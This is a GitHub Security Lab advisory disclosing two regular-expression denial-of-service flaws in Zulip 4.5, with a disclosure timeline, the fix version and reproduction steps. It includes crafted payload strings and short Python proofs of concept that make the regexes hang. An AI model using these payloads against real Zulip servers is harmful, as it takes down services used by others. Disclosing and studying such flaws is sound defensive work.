
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 8, 2021
# GHSL-2021-118: ReDoS (Regular Expression Denial of Service) in Zulip - CVE-2021-41115

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Erik Krogh Kristensen, Rasmus Petersen](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2021-08-31: Sent report to security@zulip.com.
* 2021-08-31: Reply from security@zulip.com: “Thank you for the report! We’ll investigate these and get back to you shortly.”
* 2021-09-01: Update from security@zulip.com: they have investigated and determined that the first issue is a genuine vulnerability because the regex is “accessible to users who can access organization settings to configure new linkifiers”, but the second issues is not a vulnerability because the regex “only acts on controlled inputs – namely, existing version-controlled documentation files on disk”. However, they intend to fix both regexes by switching to the [pyre2](https://pypi.org/project/pyre2/) library.
* 2021-10-04: Fixed in version 4.7: [GHSA-4h36-mqfq-42jg](https://github.com/zulip/zulip/security/advisories/GHSA-4h36-mqfq-42jg).

## Summary

Zulip contains a regular expression that is vulnerable to [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service).

## Product

Zulip

## Tested Version

[4.5](https://github.com/zulip/zulip/releases/tag/4.5)

## Details

### ReDoS

[ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS), or Regular Expression Denial of Service, is a vulnerability affecting inefficient regular expressions which can perform extremely badly when run on a crafted input string.

This vulnerability was found using a [CodeQL](https://codeql.github.com/) [query which identifies inefficient regular expressions](https://codeql.github.com/codeql-query-help/python/py-redos/).

Two separate regular expressions are vulnerable, as described below.

### Regex 1: Custom linkifiers in `zerver/models.py`.

The vulnerable regular expression is [here](https://github.com/zulip/zulip/blob/1ba708ca9636eaa39d051ac5d90dd4b54a5cf02c/zerver/models.py#L909).

Please follow these steps to reproduce the issue on a live Zulip organization:

* Go into the organization settings in a Zulip org.
* Go to the `Linkifiers` tab.
* Paste the following into the `Pattern` text box:

```
+(?P<w>a)a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>

```

* Type something into the `URL format string` text box.
* Click `Add linkifier`.
* Wait about 6 seconds for an error to appear.
* Make the above string longer for a bigger effect

A second way to see that the regular expression is vulnerable is to copy-paste it into a separate file as shown below:

* Run the code below with `python3`:

```
import re
regex = re.compile(r"^(?:(?:[\w\-#_= /:]*|[+]|[!])(\(\?P<\w+>.+\)))+$")
regex.match("+(?P<w>a)a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>a)(?P<a>")

```
### Regex 2: Markdown extensions in `zerver/openapi/markdown_extension.py`

The vulnerable regular expression is [here](https://github.com/zulip/zulip/blob/1ba708ca9636eaa39d051ac5d90dd4b54a5cf02c/zerver/openapi/markdown_extension.py#L24).

To see that the regular expression is vulnerable, copy-paste it into a separate file as shown below:

* Run the code below with `python3`:

```
import re
regex = re.compile(r"\{generate_code_example(\(\s*(.+?)\s*\))*\|\s*(.+?)\s*\|\s*(.+?)\s*(\(\s*(.+)\s*\))?\}");
regex.match("{generate_code_example(a)()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()}")

```
### Impact

This issue may lead to a denial of service.

## CVE

* CVE-2021-41115

## Credit

This issue was discovered by GitHub team members [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh) and [@yoff (Rasmus Petersen)](https://github.com/yoff).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-118` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

